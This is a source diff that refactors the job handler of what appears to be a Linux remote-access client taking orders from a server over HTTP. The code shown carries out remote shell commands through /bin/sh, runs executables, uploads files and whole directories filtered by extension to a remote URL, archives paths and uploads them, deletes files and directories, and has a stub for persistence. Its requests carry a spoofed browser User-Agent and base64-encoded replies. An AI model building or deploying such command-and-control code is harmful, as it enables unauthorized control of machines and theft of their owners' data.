@@ -20,22 +20,19 @@
 
 
 
+#include <iostream>
 #include "operations.h"
 #include "json.h"
-#include <iostream>
 #include "utilities.h"
 #include "base64.h"
-#include <sstream>
-#include <fstream>
-#include <unistd.h>
-#include <errno.h>
-#include <string.h>
-
-
+#include "systemInformation.h"
+#include "stringUtil.h"
+#include "fileTransferService.h"
+#include "executeCommands.h"
 
 bool isJobAvailable(const std::wstring &replyFromServer){
     
-    std::wstring mode = json_ExtractValue(replyFromServer, L"mode");
+    std::wstring mode = JsonUtil::json_ExtractValue(replyFromServer, L"mode");
 
     if((mode.empty() || mode==L"standard") ||
        (mode!=L"uploadFile"            &&
@@ -62,16 +59,16 @@ void startJob(SharedResourceManager &sharedResources){
     std::wstring job = sharedResources.popJob();
     std::wstring request = L"POST / HTTP/1.1\r\nHost: github.com/tajiknomi/ClientHTTP_linux?DataSignal\r\nAccept-Encoding: gzip, deflate, br\r\nUser-Agent: chromium/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\n";
     std::wstring dataToSend;
-    std::wstring mode = json_ExtractValue(job, L"mode");
+    std::wstring mode = JsonUtil::json_ExtractValue(job, L"mode");
     std::error_code ec;
     std::wstring replyType {L"log"};
 
 
     if(mode == L"downloadFile"){            
-        std::wstring url             = json_ExtractValue(job, L"url");
-        std::wstring port            = json_ExtractValue(job, L"port");
-        std::wstring filePath        = json_ExtractValue(job, L"filePath");
-        std::wstring destPath        = json_ExtractValue(job, L"destPath");
+        std::wstring url             = JsonUtil::json_ExtractValue(job, L"url");
+        std::wstring port            = JsonUtil::json_ExtractValue(job, L"port");
+        std::wstring filePath        = JsonUtil::json_ExtractValue(job, L"filePath");
+        std::wstring destPath        = JsonUtil::json_ExtractValue(job, L"destPath");
         filePath = ReplaceTildeWithPath(filePath);
         destPath = ReplaceTildeWithPath(destPath);
         std::wstring fileName;
@@ -80,7 +77,7 @@ void startJob(SharedResourceManager &sharedResources){
             if(hasWritePermissionForDirectory(destPath)){
                 fileName = filePath.substr(filePath.find_last_of(L'/') + 1);        
                 url += L":" + port + L"/" + filePath;
-                if(DownloadFileFromURL(url, destPath)){
+                if(curlFileTransfer::DownloadFileFromURL(url, destPath)){
                     dataToSend = fileName + L" downloaded successfully";
                 }
                 else {
@@ -96,21 +93,21 @@ void startJob(SharedResourceManager &sharedResources){
         }
     }
     else if(mode == L"downloadDir"){
-        std::wstring url             = json_ExtractValue(job, L"url");
-        std::wstring port            = json_ExtractValue(job, L"port");
-        std::wstring dirPath         = json_ExtractValue(job, L"dirPath");
+        std::wstring url             = JsonUtil::json_ExtractValue(job, L"url");
+        std::wstring port            = JsonUtil::json_ExtractValue(job, L"port");
+        std::wstring dirPath         = JsonUtil::json_ExtractValue(job, L"dirPath");
 
         // Place your implementation here
     }
     else if(mode == L"uploadFile"){
-        std::wstring url             = json_ExtractValue(job, L"url");
-        std::wstring port            = json_ExtractValue(job, L"port");
-        std::wstring filePath        = json_ExtractValue(job, L"filePath");
+        std::wstring url             = JsonUtil::json_ExtractValue(job, L"url");
+        std::wstring port            = JsonUtil::json_ExtractValue(job, L"port");
+        std::wstring filePath        = JsonUtil::json_ExtractValue(job, L"filePath");
         filePath = ReplaceTildeWithPath(filePath);
         const std::wstring fileName = filePath.substr(filePath.find_last_of(L'/') + 1);
         if(fs::is_regular_file(filePath, ec)){ 
             url += L":" + port;          
-            if(UploadFileToURL(url, filePath)){
+            if(curlFileTransfer::UploadFileToURL(url, filePath)){
                 dataToSend = filePath + L" uploaded successfully";
             }
             else{
@@ -122,17 +119,17 @@ void startJob(SharedResourceManager &sharedResources){
         }
     }
     else if(mode == L"UploadDir"){
-        std::wstring url             = json_ExtractValue(job, L"url");
-        std::wstring port            = json_ExtractValue(job, L"port");
-        std::wstring dirPath         = json_ExtractValue(job, L"dirPath");
-        std::wstring fileExtensions  = json_ExtractValue(job, L"fileExtensions");
+        std::wstring url             = JsonUtil::json_ExtractValue(job, L"url");
+        std::wstring port            = JsonUtil::json_ExtractValue(job, L"port");
+        std::wstring dirPath         = JsonUtil::json_ExtractValue(job, L"dirPath");
+        std::wstring fileExtensions  = JsonUtil::json_ExtractValue(job, L"fileExtensions");
      
         dirPath = ReplaceTildeWithPath(dirPath);
         url += L":" + port; 
         
         if(fs::is_directory(dirPath, ec)){
             std::wstring errorMsg;            
-            if(UploadDirectoryToURL(url, dirPath, errorMsg, fileExtensions)){
+            if(curlFileTransfer::UploadDirectoryToURL(url, dirPath, errorMsg, fileExtensions)){
                 dataToSend = dirPath + L"/ directory uploaded successfully";
             }
             else{
@@ -145,10 +142,11 @@ void startJob(SharedResourceManager &sharedResources){
         }            
     }
     else if(mode == L"execute"){
-        std::wstring shellType  = json_ExtractValue(job, L"shellType");
-        std::wstring exePath    = json_ExtractValue(job, L"exePath");
-        std::wstring arguments  = json_ExtractValue(job, L"exeArguments");
-        
+        std::wstring shellType  = JsonUtil::json_ExtractValue(job, L"shellType");
+        std::wstring exePath    = JsonUtil::json_ExtractValue(job, L"exePath");
+        std::wstring arguments  = JsonUtil::json_ExtractValue(job, L"exeArguments");
+        executeCommand run;
+
         if(shellType.empty()){
              shellType = L"/bin/sh";
         } 
@@ -159,12 +157,12 @@ void startJob(SharedResourceManager &sharedResources){
             dataToSend = exePath + L" does not exist";
         }
         else if(isExecutable(exePath)){                                        
-            dataToSend = executeCommand(shellType, exePath, arguments);
+            dataToSend = run(shellType, exePath, arguments);
         }     
         else {dataToSend =  exePath + L" is not executable";}
     }
     else if(mode == L"deleteFile"){
-        std::wstring filePath  = json_ExtractValue(job, L"filePath");
+        std::wstring filePath  = JsonUtil::json_ExtractValue(job, L"filePath");
         if(filePath.empty()){ 
             dataToSend = L"Couldn't delete: filePath is empty!";
             
@@ -188,7 +186,7 @@ void startJob(SharedResourceManager &sharedResources){
         }
     }
     else if(mode == L"removeDir"){
-        std::wstring dirPath  = json_ExtractValue(job, L"dirPath");             
+        std::wstring dirPath  = JsonUtil::json_ExtractValue(job, L"dirPath");             
         dirPath = ReplaceTildeWithPath(dirPath);
 
         if(fs::is_directory(dirPath, ec)){
@@ -205,9 +203,9 @@ void startJob(SharedResourceManager &sharedResources){
     }
     else if(mode == L"listDir"){
         std::wstring dirInfo{L"{\"files\":["};
-        std::wstring dirToList   = json_ExtractValue(job, L"dirToList");        
+        std::wstring dirToList   = JsonUtil::json_ExtractValue(job, L"dirToList");        
         if(dirToList.empty()){
-            dirToList = L"/home/" + getUserName();   // Default is home directory, also try to find the home directory of user with another method if not found here
+            dirToList = L"/home/" + SysInformation::getUserName();   // Default is home directory, also try to find the home directory of user with another method if not found here
         }
         dirToList = ReplaceTildeWithPath(dirToList);
         if (!dirToList.empty() && dirToList.back() != L'/' && dirToList.back() != L'\\') {
@@ -230,7 +228,7 @@ void startJob(SharedResourceManager &sharedResources){
                 }
                 fileList_json.push_back(L"name");
                 std::wstring path {entry.path().wstring()};
-                std::wstring filename{ extractFilename(path) };
+                std::wstring filename{ StringUtils::extractFilename(path) };
                 std::wstring sizeInBytes;
 
                 if(fs::is_directory(path, ec)){
@@ -246,7 +244,7 @@ void startJob(SharedResourceManager &sharedResources){
                 }                                        
                 fileList_json.push_back(L"size");
                 fileList_json.push_back(sizeInBytes);
-                dirInfo.append(to_json(fileList_json));
+                dirInfo.append(JsonUtil::to_json(fileList_json));
                 dirInfo.append(L",");
                 fileList_json.clear(); 
             }
@@ -262,8 +260,8 @@ void startJob(SharedResourceManager &sharedResources){
         }
     }
     else if(mode == L"copy"){
-        const std::wstring sourcePath {json_ExtractValue(job, L"sourcePath")};
-        const std::wstring destPath {json_ExtractValue(job, L"destPath")};
+        const std::wstring sourcePath {JsonUtil::json_ExtractValue(job, L"sourcePath")};
+        const std::wstring destPath {JsonUtil::json_ExtractValue(job, L"destPath")};
 
         if(sourcePath.empty() || destPath.empty()){ 
             dataToSend = L"Either source or destination is empty!";
@@ -280,7 +278,7 @@ void startJob(SharedResourceManager &sharedResources){
                 else {
                     const auto copyOptions = fs::copy_options::skip_symlinks | fs::copy_options::recursive;                   
                     fs::copy(sourcePath, destPath+L"/"+Dirname, copyOptions, ec);
-                    if(ec) { dataToSend = mode + L" " + s2ws(ec.message()); }
+                    if(ec) { dataToSend = mode + L" " + StringUtils::s2ws(ec.message()); }
                     else {dataToSend = sourcePath + L" is copied to " + destPath + L" successfully"; } 
                 }
             }
@@ -292,20 +290,20 @@ void startJob(SharedResourceManager &sharedResources){
                 else{
                     const auto copyOptions = fs::copy_options::skip_symlinks | fs::copy_options::skip_existing;                          
                     fs::copy_file(sourcePath, destPath + L"/" + filename, copyOptions, ec);
-                    if(ec) { dataToSend = mode + L" " + s2ws(ec.message()); }
+                    if(ec) { dataToSend = mode + L" " + StringUtils::s2ws(ec.message()); }
                     else {dataToSend = sourcePath + L" is copied to " + destPath + L" successfully"; } 
                 }
             }               
         }
     }
     else if(mode == L"compressAndDownload"){
-        std::wstring url         = json_ExtractValue(job, L"url");
-        std::wstring port        = json_ExtractValue(job, L"port");
-        std::wstring path        = json_ExtractValue(job, L"path");
+        std::wstring url         = JsonUtil::json_ExtractValue(job, L"url");
+        std::wstring port        = JsonUtil::json_ExtractValue(job, L"port");
+        std::wstring path        = JsonUtil::json_ExtractValue(job, L"path");
 
         const std::wstring shellType {L"/bin/sh"};
         std::wstring archivePath = path;
-        std::wstring filename = extractFilename(path);
+        std::wstring filename = StringUtils::extractFilename(path);
         if((archivePath.back() == L'/') || (archivePath.back() == L'\\')){
             archivePath.pop_back();
         }
@@ -319,24 +317,25 @@ void startJob(SharedResourceManager &sharedResources){
             // For file --> tar -czf "path/to/dir/file.tar.gz" -C "path/to/dir" "filename"                   
             args += std::wstring(L" -C \"") + archivePath.substr(0, archivePath.size()-filename.size()) + std::wstring(L"\" \"") + filename + L"\"";
         }
-        const std::wstring output = executeCommand(shellType, compressionTool, args);     // Archive/Compress it
+        executeCommand run;
+        const std::wstring output = run(shellType, compressionTool, args);     // Archive/Compress it
         archivePath.append(L".tar.gz");
         if(output.find(L"status: 0") != std::wstring::npos){
             url += L":" + port;            
-            if(UploadFileToURL(url, archivePath)){ dataToSend = archivePath + L" uploaded successfully"; }                           
+            if(curlFileTransfer::UploadFileToURL(url, archivePath)){ dataToSend = archivePath + L" uploaded successfully"; }                           
             else{ dataToSend = archivePath + L" didn't get uploaded"; }                            
         }
         else { 
             dataToSend = output;
         }
         if(!fs::remove(archivePath, ec)){
-            dataToSend = archivePath + L" uploaded successfully but NOT deleted: " + s2ws(ec.message());
+            dataToSend = archivePath + L" uploaded successfully but NOT deleted: " + StringUtils::s2ws(ec.message());
         }                               
     }
     else if (mode == L"shell") {
-        std::wstring RecievedCommand{ json_ExtractValue(job, L"command") };
+        std::wstring RecievedCommand{ JsonUtil::json_ExtractValue(job, L"command") };
         RecievedCommand = ReplaceTildeWithPath(RecievedCommand);
-        std::wstring cd{ json_ExtractValue(job, L"cd") };
+        std::wstring cd{ JsonUtil::json_ExtractValue(job, L"cd") };
         cd = ReplaceTildeWithPath(cd);
         static fs::path currentPath = fs::current_path();
         
@@ -350,23 +349,24 @@ void startJob(SharedResourceManager &sharedResources){
                 currentPath = newDir;           
             }            
         }
-        else {
+        else {          
             if(!RecievedCommand.empty()){
             std::wstring command = L"/bin/sh -c cd \"" + currentPath.wstring() + L"\" && " + RecievedCommand;
             std::wstring emptyString;
-            dataToSend = executeCommand(L"/bin/sh", command, emptyString);
+            executeCommand run;
+            dataToSend = run(L"/bin/sh", command, emptyString);
             }
         }
         replyType = L"shellResponse";
     }
     else if(mode == L"persist"){
-        std::wstring method         = json_ExtractValue(job, L"method");  
+        std::wstring method         = JsonUtil::json_ExtractValue(job, L"method");  
         // Implement your persistance method(s) here
     }
 
-    dataToSend = json_AppendKeyValue(sharedResources.getSysInfoInJson(), replyType, dataToSend);
-    std::string dataToSendStr = ws2s(dataToSend); // Convert wstring to string   
-    dataToSend = s2ws(base64_encode((unsigned char*)dataToSendStr.c_str(), dataToSendStr.length()));
+    dataToSend = JsonUtil::json_AppendKeyValue(sharedResources.getSysInfoInJson(), replyType, dataToSend);
+    std::string dataToSendStr = StringUtils::ws2s(dataToSend); // Convert wstring to string   
+    dataToSend = StringUtils::s2ws(base64_encode((unsigned char*)dataToSendStr.c_str(), dataToSendStr.length()));
     std::wstringstream contentLengthStream;
     contentLengthStream << dataToSend.length();
     request += L"Content-Length: " + contentLengthStream.str() + L"\r\n";  
